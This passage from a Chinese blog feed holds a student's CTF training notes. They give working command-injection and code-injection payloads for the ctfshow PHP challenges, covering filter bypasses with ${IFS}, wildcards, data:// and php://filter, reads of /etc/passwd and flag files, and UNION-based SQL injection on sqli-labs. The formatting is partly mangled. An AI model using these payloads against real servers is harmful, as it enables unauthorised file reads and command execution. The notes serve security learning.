alt="1468796-20181129163944903-21726820"></p><blockquote><p>is_numeric：如果指定的变量是数字和数字字符串则返回 TRUE，否则返回 FALSE，注意浮点型返回空值，即 FALSE。</p></blockquote><ul><li>php是一种弱语言 所以只要可以输入一个字符串 1‘或者1x都可以</li></ul>]]></content>
      
      
      <categories>
          
          <category> 实训 </category>
          
          <category> 2021 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实训2021 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实训7.8</title>
      <link href="/2021/07/13/%E5%AE%9E%E8%AE%AD7-8/"/>
      <url>/2021/07/13/%E5%AE%9E%E8%AE%AD7-8/</url>
      
        <content type="html"><![CDATA[<p><em>2021/7/8</em></p><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>（上头）</p><h5 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h5><p><img src="/2021/07/13/%E5%AE%9E%E8%AE%AD7-8/image-20210708085022554.png" alt="image-20210708085022554"></p><p>【给翻译翻译什么叫黑洞】就是不会保存</p><blockquote><p>1：&gt; 代表重定向到哪里，例如：echo “123” &gt; /home/123.txt<br>2：/dev/null 代表空设备文件<br>3：2&gt; 表示stderr标准错误<br>4：&amp; 表示等同于的意思，2&gt;&amp;1，表示2的输出重定向等同于1<br>5：1 表示stdout标准输出，系统默认值是1，所以”&gt;/dev/null”等同于 “1&gt;/dev/null”<br>因此，&gt;/dev/null 2&gt;&amp;1 也可以写成“1&gt; /dev/null 2&gt; &amp;1”</p><p>那么本文标题的语句执行过程为：<br>1&gt;/dev/null ：首先表示标准输出重定向到空设备文件，也就是不输出任何信息到终端，也就是不显示任何信息。<br>2&gt;&amp;1 ： 接着，标准错误输出重定向到标准输出，因为之前标准输出已经重定向到了空设备文件，所以标准错误输出也重定向到空设备文件。</p></blockquote><p><img src="/2021/07/13/%E5%AE%9E%E8%AE%AD7-8/image-20210708085120511.png" alt="image-20210708085120511"></p><p>可以双写绕过。eg.url/?c=ls;ls <em>//第一个ls不执行 第二个执行</em></p><p>无过滤 直接刚</p><ul><li><p>```<br>/?c=tac flag.php;ls //第二个命令被写入黑洞 第一个命令正常输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- hint标答</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>/?c=tac flag.php%0a</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">##### web43</span><br><span class="line"></span><br><span class="line">![image-20210708092318402](实训7-8/image-20210708092318402.png)</span><br><span class="line"></span><br><span class="line">过滤分号</span><br><span class="line"></span><br><span class="line">- &amp;&amp;代替 ; （要用url编码）</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>/?c=tac flag.php%26%26ls</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- ||代替;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>/?c=tac%09flag.php||</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 常规</span><br><span class="line">  </span><br></pre></td></tr></table></figure><p>/?c=nl flag.php%0a –&gt; 查看源代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line">  - **nl** (Number of Lines) 将指定的文件添加行号标注后写到标准输出。如果不指定文件或指定文件为&quot;-&quot; ，程序将从标准输入读取数据</span><br><span class="line">  - tac | cat也可以</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">##### web44</span><br><span class="line"></span><br><span class="line">![image-20210708094227801](实训7-8/image-20210708094227801.png)</span><br><span class="line"></span><br><span class="line">- ```</span><br><span class="line">  /?c=tac fla*.php%0a</span><br></pre></td></tr></table></figure></li><li><p>```<br>/?c=tac fla*.php%26%26ls</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">##### web45</span><br><span class="line"></span><br><span class="line">![image-20210708095807187](实训7-8/image-20210708095807187.png)</span><br><span class="line"></span><br><span class="line">- 空格被屏蔽了 用制表符tab（%09）或者￥$&#123;IFS&#125;代替</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>/?c=tac%09fla?.php%26%26ls</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- hint标答 </span><br><span class="line">  </span><br><span class="line">  ````</span><br><span class="line">  /?c=echo$IFS`tac$IFS*`%0A </span><br><span class="line">  ````</span><br><span class="line">  </span><br><span class="line">  - 不能用fla?.php绕过flag过滤（？</span><br><span class="line"></span><br><span class="line">haoxiaoxiyinweifangfataiduowobuhuiguinalehehe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 命令分隔符5种姿势</span><br><span class="line"></span><br><span class="line">先贴上 能用再说</span><br><span class="line"></span><br><span class="line">- `%0a`符号</span><br><span class="line">- 换行符</span><br><span class="line">- `%0d`符号</span><br><span class="line">- 回车符</span><br><span class="line">- ; 符号</span><br><span class="line">- 在 shell 中，担任”连续指令”功能的符号就是”分号”</span><br><span class="line">- `&amp;`符号</span><br><span class="line">- ![image-20210708103219419](实训7-8/image-20210708103219419.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">##### web46</span><br><span class="line"></span><br><span class="line">![image-20210708103203395](实训7-8/image-20210708103203395.png)</span><br><span class="line"></span><br><span class="line">屏蔽数字不影响（目前</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">##### web47</span><br><span class="line"></span><br><span class="line">![image-20210708112407043](实训7-8/image-20210708112407043.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">##### web48</span><br><span class="line"></span><br><span class="line">![image-20210708112658975](实训7-8/image-20210708112658975.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">##### web49</span><br><span class="line"></span><br><span class="line">![image-20210708112839811](实训7-8/image-20210708112839811.png)</span><br><span class="line"></span><br><span class="line">（以上都可以用45方法）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">##### web50</span><br><span class="line"></span><br><span class="line">![image-20210708115646917](实训7-8/image-20210708115646917.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">- ```</span><br><span class="line">  /?c=nl&lt;&gt;fla&#x27;&#x27;g.php||ls</span><br></pre></td></tr></table></figure></li><li><p>或者</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?c=tac&lt;&gt;fla\g.php||</span><br></pre></td></tr></table></figure><p>把过滤姿势混搭了一下</p></li></ul><h5 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h5><p><img src="/2021/07/13/%E5%AE%9E%E8%AE%AD7-8/image-20210708115601500.png" alt="image-20210708115601500"></p><ul><li><p>不支持通配 用’’分隔</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?c=nl&lt;fla&#x27;&#x27;g.php||</span><br></pre></td></tr></table></figure></li></ul><h5 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h5><p><img src="/2021/07/13/%E5%AE%9E%E8%AE%AD7-8/image-20210708144821016.png" alt="image-20210708144821016"></p><p>（同上）</p><h5 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h5><p><img src="/2021/07/13/%E5%AE%9E%E8%AE%AD7-8/image-20210708120353551.png" alt="image-20210708120353551"></p><p>没黑洞了</p><ul><li>```<br>/?c=ta\c${IFS}fla\g.php<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">##### web54</span><br><span class="line"></span><br><span class="line">代码如下</span><br><span class="line"></span><br></pre></td></tr></table></figure>if(isset($_GET[‘c’])){<br>$c=$_GET[‘c’];<br>if(!preg_match(“/;|.*c.*a.<em>t.</em>|.*f.*l.*a.<em>g.</em>| |[0-9]|*|.*m.*o.*r.<em>e.</em>|.*w.*g.*e.<em>t.</em>|.*l.*e.*s.<em>s.</em>|.*h.*e.*a.<em>d.</em>|.*s.*o.*r.<em>t.</em>|.*t.*a.*i.<em>l.</em>|.*s.*e.<em>d.</em>|.*c.*u.<em>t.</em>|.*t.*a.<em>c.</em>|.*a.*w.<em>k.</em>|.*s.*t.*r.*i.*n.*g.<em>s.</em>|.*o.<em>d.</em>|.*c.*u.*r.<em>l.</em>|.*n.<em>l.</em>|.*s.*c.<em>p.</em>|.*r.<em>m.</em>|`|%|\x09|\x26|&gt;|&lt;/i”, $c)){<br>system($c);<br>}<br>}else{<br>highlight_file(<strong>FILE</strong>);<br>}<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">截图太长了没法玩</span><br><span class="line"></span><br><span class="line">- 替换思想 先后执行三次</span><br><span class="line"></span><br></pre></td></tr></table></figure>url/?c=ls //查看flag文件名 显示flag.php index.php<br>url/?c=mv${IFS}fla?.php${IFS}z.txt<br>url/?c=ls //再次访问目录<br>url/z.txt<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  ![第三步得到这个](实训7-8/image-20210708153312887.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">##### web55 XX</span><br><span class="line"></span><br><span class="line">![image-20210708153458428](实训7-8/image-20210708153458428.png)</span><br><span class="line"></span><br><span class="line">无字母 无.(shell)</span><br><span class="line"></span><br><span class="line">- ```</span><br><span class="line">  url/?c=/???/????64 ????.???</span><br></pre></td></tr></table></figure><ul><li>意思是 url/?c=/bin/base64 flag.php</li><li>base64转码得到flag</li></ul></li><li>```<br>url/?c=/???/???/????2 ????.???<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line">  - 意思是 url/?c=/usr/bin/bzip2 flag.php</span><br><span class="line">  - url/flag.php.bz2</span><br><span class="line">  - &lt;em&gt;bzip2是linux下面的压缩文件的命令&lt;/em&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">##### web56 XXXX</span><br><span class="line"></span><br><span class="line">https://blog.csdn.net/qq_46091464/article/details/108513145</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">##### web57</span><br><span class="line"></span><br><span class="line">![image-20210708173459962](实训7-8/image-20210708173459962.png)</span><br><span class="line"></span><br><span class="line">https://www.wlhhlc.top/posts/14827/#web57</span><br><span class="line"></span><br><span class="line">- ```</span><br><span class="line">  url/?c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure></li></ul><blockquote><p><code>$(())</code> 代表做一次运算，因为里面为空，也表示值为0<br><code>$((~$(())))</code> 对0作取反运算，值为-1<br><code>$(($((~$(())))$((~$(())))))</code> -1-1，也就是(-1)+(-1)为-2，所以值为-2<br><code>$((~$(($((~$(())))$((~$(())))))))</code> 再对-2做一次取反得到1，所以值为1</p><p>如果对a按位取反，则得到的结果为-(a+1)，也就是对0取反得到-1</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 实训 </category>
          
          <category> 2021 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实训2021 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实训7.7</title>
      <link href="/2021/07/13/%E5%AE%9E%E8%AE%AD7-7/"/>
      <url>/2021/07/13/%E5%AE%9E%E8%AE%AD7-7/</url>
      
        <content type="html"><![CDATA[<p><em>2021/7/7</em></p><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><h5 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h5><p><img src="/2021/07/13/%E5%AE%9E%E8%AE%AD7-7/image-20210707112056235.png" alt="image-20210707112056235"></p><p>题目提示：<em>nginx的日志文件/var/log/nginx/access.log</em></p><ul><li><p>替换</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/?c=data://text/plain,&lt;?=system(&quot;cp fla*.* 1.txt&quot;);?&gt;  url/1.txt 得到源代码</span><br></pre></td></tr></table></figure><ul><li><?= 是短标签</li></li><li><p>mv命令用来对文件或目录重新命名，或者将文件从一个目录移到另一个目录中。source表示源文件或目录，target表示目标文件或目录。如果将一个文件移到一个已经存在的目标文件中，则目标文件的内容将被覆盖。<code>mv [选项] source target</code></p><p>cp 命令复制一个文件，而原文件保持不变。如果把一个文件复制到一个目标文件中，而目标文件已经存在，那么，该目标文件的内容将被破坏。此命令中所有参数既可以是绝对路径名，也可以是相对路径名。<code>cp [选项] 源文件或目录 目标文件或目录</code></p><p><em>mv只是移动了文件，文件的一切都没有改变，而 cp是在目标文件夹中创建了新的文件。</em></p><p><a href="http://www.pgygho.com/help/fwq/14551.html">mv和cp的区别</a></p></li></ul></li></ul><h5 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h5><p><img src="/2021/07/13/%E5%AE%9E%E8%AE%AD7-7/image-20210707114839622.png" alt="image-20210707114839622"></p><p>强制加了后缀php</p><ul><li><p>依然可用 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?c=data://text/plain,&lt;?=phpinfo();?&gt;</span><br></pre></td></tr></table></figure><p>代码完成后.php不会作为命令执行</p><ul><li>data://text/plain, 这样就相当于执行了php语句 .php 因为前面的php语句已经闭合了，所以后面的 .php会被当成 html页面直接显示在页面上，起不到什么作用</li></ul><p><img src="/2021/07/13/%E5%AE%9E%E8%AE%AD7-7/image-20210707114743011.png" alt="image-20210707114743011"></p><p>​        后面出现的1.php phpinfo()返回值为1 所以方法同38</p></li><li><p>之前的方法还可用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/?c=system(&quot;cp fla?.php 1.txt&quot;) ; --&gt; url/1.txt</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/?c=`cp fla?.php 1.txt`;  --&gt; url/1.txt</span><br></pre></td></tr></table></figure></li></ul><h5 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h5><p><img src="/2021/07/13/%E5%AE%9E%E8%AE%AD7-7/image-20210707144728782.png" alt="image-20210707144728782"></p><p>重新用eval 但是没有直接说flag在flag.php里</p><ul><li><p>hint答案 1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/?c=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure><ul><li>localeconv() 函数返回一包含本地数字及货币格式信息的数组。</li><li>pos() 函数返回数组中的当前元素的值，默认取第一个值，pos是current的别名。</li><li>scandir() 函数返回指定目录中的文件和目录的数组。</li><li>array_reverse() 函数以相反的元素顺序返回数组。</li><li>next() 返回迭代器的下一个项目。</li><li>show_source() 函数对文件进行语法高亮显示，highlight_file() 的别名</li></ul><p><img src="/2021/07/13/%E5%AE%9E%E8%AE%AD7-7/image-20210707163134240.png" alt="image-20210707163134240"></p><p><img src="/2021/07/13/%E5%AE%9E%E8%AE%AD7-7/image-20210707163306576.png" alt="image-20210707163306576"></p></li><li><p>hint 答案 2 【不行】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?c=session_start();system(session_id()); </span><br></pre></td></tr></table></figure><p>–&gt; **application **-&gt; Name=PHPSESSID Value=ls 提交页面出现目录<img src="/2021/07/13/%E5%AE%9E%E8%AE%AD7-7/image-20210707153358429.png" alt="image-20210707153358429">但是不可见文件具体内容 后来找到一个解释 ↓</p><p><img src="/2021/07/13/%E5%AE%9E%E8%AE%AD7-7/image-20210707162658780.png" alt="image-20210707162658780"></p><p><a href="https://www.wlhhlc.top/posts/14827/#web40">https://www.wlhhlc.top/posts/14827/#web40</a> 这个比较细</p><ul><li><p>```<br>?c=print_r(scandir(current(localeconv()))); //打印当前目录下文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![image-20210707154741699](实训7-7/image-20210707154741699.png)</span><br><span class="line"></span><br><span class="line">+ ```</span><br><span class="line">  /?c=show_source(next(array_reverse(scandir(getcwd()))));//观察flag.php在倒数第二位 开始构造</span><br></pre></td></tr></table></figure><p><img src="/2021/07/13/%E5%AE%9E%E8%AE%AD7-7/image-20210707154836941.png" alt="image-20210707154836941"></p><p>getcwd() — Gets the current working directory</p></li></ul></li><li><p>b站答案 【我没成功 hackbar不一样好像】 原理类似hint1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?c=print_r(get_defined_vars()); //获取所有变量</span><br></pre></td></tr></table></figure><p><img src="/2021/07/13/%E5%AE%9E%E8%AE%AD7-7/image-20210707155547720.png" alt="image-20210707155547720"></p><p>enable post 输入phpinfo(); <em>至今不知道哪输入的 录屏屏幕不完整啊orz</em></p><p>然后/?c=print(array_pop(next(get_defined_vars()))); 发现可行</p><p>最后把print改成eval phpinfo();改成需要的代码 提交</p></li></ul><h5 id="web41-XXXX"><a href="#web41-XXXX" class="headerlink" title="web41 XXXX"></a>web41 XXXX</h5><p><img src="/2021/07/13/%E5%AE%9E%E8%AE%AD7-7/image-20210707163348283.png" alt="image-20210707163348283"></p><p><a href="https://blog.csdn.net/miuzzx/article/details/108569080">hint</a></p><ul><li><p>突破点在没有屏蔽异或 <code>|</code>运算 可以通过两个字符的异或拼出想要的字符</p><p>比如：(‘%40’|’%01’) &lt;–&gt; (‘A’)（16进制异或运算得到65对应ascii码）</p><p>代码写成<code>(&#39;phpinfo&#39;)();</code>是可以被浏览器执行的</p><p>用现有字符拼出所有所需字符</p></li><li><p>其中的php代码相当于生成异或字典 python相当于自动输入</p><ul><li>exp.py 用法 `python exp.py url</li></ul><p>【对我来说是python3】</p><p>tamadekazaipythonshanglexuepythonqulebaibai</p></li></ul><p>看python去了</p><h4 id="命令执行方法要点"><a href="#命令执行方法要点" class="headerlink" title="命令执行方法要点"></a>命令执行方法要点</h4><p><em>工具  hackbar（ f12）</em></p><p><em>firefox使用 hackbar：用 max hackbar| 下载2.1.3的版本 关闭插件自动更新</em></p><ul><li><p>技巧</p><ul><li>*？代替字符 ‘’分割字符串</li><li>system() &lt;–&gt; ``</li><li>mv &lt;–&gt; cp</li><li>tac &lt;–&gt; cat(不直接回显)</li><li>include &lt;–&gt;require</li></ul></li><li><p>新设置参数逃逸 $_GET</p></li><li><p>data伪协议/文件包含url/?c=data://text/plain,&lt;php代码&gt;</p></li><li><pre><code>url/?c=show_source(next(array_reverse(scandir(pos(localeconv())))));</code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> 实训 </category>
          
          <category> 2021 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实训2021 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实训7.6</title>
      <link href="/2021/07/13/%E5%AE%9E%E8%AE%AD7-6/"/>
      <url>/2021/07/13/%E5%AE%9E%E8%AE%AD7-6/</url>
      
        <content type="html"><![CDATA[<p><em>2021/7/6</em></p><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><h5 id="sqlmap使用"><a href="#sqlmap使用" class="headerlink" title="sqlmap使用"></a>sqlmap使用</h5><p>需要python2.7环境</p><ul><li>需要python时说明python2或者Python3</li></ul><p>输入<code>python sqlmap.py</code>+命令行</p><h4 id="sqli-labs"><a href="#sqli-labs" class="headerlink" title="sqli-labs"></a>sqli-labs</h4><h5 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h5><p>字符型注入</p><p><code>url/?id=1&#39; order by 4#</code></p><p><em> 直接输入无效就用url编码（要构造#闭合）</em></p><p><code>url/?id=1%27%20order%20by%204%23</code></p><p>依次尝试 验证有3列</p><p><img src="/2021/07/13/%E5%AE%9E%E8%AE%AD7-6/image-20210706102005600.png" alt="image-20210706102005600"></p><p>获取数据库名称</p><p><code>url/?id=&#39; union select null,database(),3#</code></p><p><img src="/2021/07/13/%E5%AE%9E%E8%AE%AD7-6/image-20210706101910261.png" alt="image-20210706101910261"></p><p>获取全部数据库名称</p><p><code>url/?id=&#39; union select null,(select group_concat(schema_name) from information_schema.schemata),null#</code></p><p><img src="/2021/07/13/%E5%AE%9E%E8%AE%AD7-6/image-20210706104513276.png" alt="image-20210706104513276"></p><p><code>url/?id=&#39;union select null,null,(select group_concat(table_name) from information_schema.tables where table_schema=database())#</code></p><p>tamadexiebuxiaqulekaishikanyufa</p><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p><em><em>命令执行和代码执行的区别</em></em></p><h5 id="代码执行：-将用户输入作为系统命令的参数拼接到系统命令中"><a href="#代码执行：-将用户输入作为系统命令的参数拼接到系统命令中" class="headerlink" title="代码执行： 将用户输入作为系统命令的参数拼接到系统命令中"></a>代码执行： 将用户输入作为系统命令的参数拼接到系统命令中</h5><p>代码执行漏洞是把代码注入到Web服务器中执行，而命令执行漏洞执行的系统命令。主要有两种产生原因：代码执行函数和动态函数执行，在php中还存在双引号执行的情况。常见的导致代码执行的函数有：eval()、assert()、preg_replace()、call_user_func()、array_map()</p><h5 id="命令执行：将用户输入作为系统命令的参数拼接到系统命令中"><a href="#命令执行：将用户输入作为系统命令的参数拼接到系统命令中" class="headerlink" title="命令执行：将用户输入作为系统命令的参数拼接到系统命令中"></a>命令执行：将用户输入作为系统命令的参数拼接到系统命令中</h5><p>相比较代码执行漏洞，命令执行漏洞的危害更大，它所执行的命令会继承WebServer的权限，也就是说可以任意读取、修改、执行Web目录下的任何文件。能够进行命令执行的php函数一共有七个，分别是：system()、exec()、shell_exec()、passthru()、pcntl_exec()、popen()、proc_open()，除函数外，倒引号(这里用反向单引号)内的内容也可以进行命令执行</p><p><a href="https://www.cnblogs.com/richardlee97/p/10627432.html">https://www.cnblogs.com/richardlee97/p/10627432.html</a></p><h5 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h5><p>过滤逐渐变态</p><p><code>   if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#39;/i&quot;, $c))&#123;eval($c);&#125;</code></p><p><em>//模式分隔符后的”i”标记这是一个大小写不敏感的搜索</em></p><ul><li><p>/?c=show_source**(<strong>next</strong>(<strong>array_reverse</strong>(<strong>scandir</strong>(<strong>pos</strong>(**localeconv()))))); </p><p>这个是真离谱</p></li><li><p>/?c=echo%09<code>tac%09*</code>; //注意绕过空格 %20(space)可以用%09(tab)代替</p></li><li><p>ctfshow标答</p><ul><li>url//?c=eval($_GET[1]);&amp;1=phpinfo();//让1这个参数逃逸出去 所有被ban的字符都可以使用</li></ul><ul><li>url/?c=eval($_GET[1]);&amp;1=system(‘cat flag.php’);</li><li>查看源代码 //用tac可以不用查看源代码直接查看</li></ul></li></ul><h5 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h5><p><img src="/2021/07/13/%E5%AE%9E%E8%AE%AD7-6/image-20210706170453734.png" alt="image-20210706170453734"></p><ul><li><p>url/?c=include%0a$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</p><ul><li><p>因为分号引号空格括号等等都被ban了 用include代替（文件包含）%0a代表换行</p></li><li><p>get实现参数逃逸 （可以先用&amp;1=/etc/passwd验证）</p></li><li><p>php://filter/convert.base64-encode/resource=路劲hackbar插件里有（LFI–Using wrappers)</p></li><li><p>得到一长串字符 hackbar base64解码得到flag</p></li></ul></li></ul><h5 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h5><p><img src="/2021/07/13/%E5%AE%9E%E8%AE%AD7-6/image-20210706192944994.png" alt="image-20210706192944994"></p><p>多屏蔽了一个双引号</p><ul><li><p>上一题的方法依然可用 发现甚至可以不加%0a换行</p></li><li><ul><li><p>url/?c=require$_GET[1]?&gt;&amp;1=/etc/passwd 验证可行</p></li><li><p>/?c=require$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</p></li><li><p>得到字符串 base64转码 得到flag</p></li></ul></li></ul><ol><li><p><em>require() 语句的性能与 include() 相类似，都是包括并运行指定文件。require() 和 include() 语句是语言结构，不是真正的函数，可以像 php 中其他的语言结构一样，例如 echo() 可以使用 echo(“ab”) 形式，也可以使用 echo “abc” 形式输出字符串 abc。require() 和 include() 语句也可以不加圆括号而直接加参数。</em></p></li><li><p><em>GET里的参数外的引号可以不加 向下兼容</em></p></li></ol><h5 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h5><p><img src="/2021/07/13/%E5%AE%9E%E8%AE%AD7-6/image-20210706195352479.png" alt="image-20210706195352479"></p><h5 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h5><p><img src="/2021/07/13/%E5%AE%9E%E8%AE%AD7-6/image-20210706200107010.png" alt="image-20210706200107010"></p><h5 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h5><p><img src="/2021/07/13/%E5%AE%9E%E8%AE%AD7-6/image-20210706200359822.png" alt="image-20210706200359822"></p><p>同上。35新增屏蔽了左尖括号&lt; 没有影响</p><p>36新增屏蔽数字 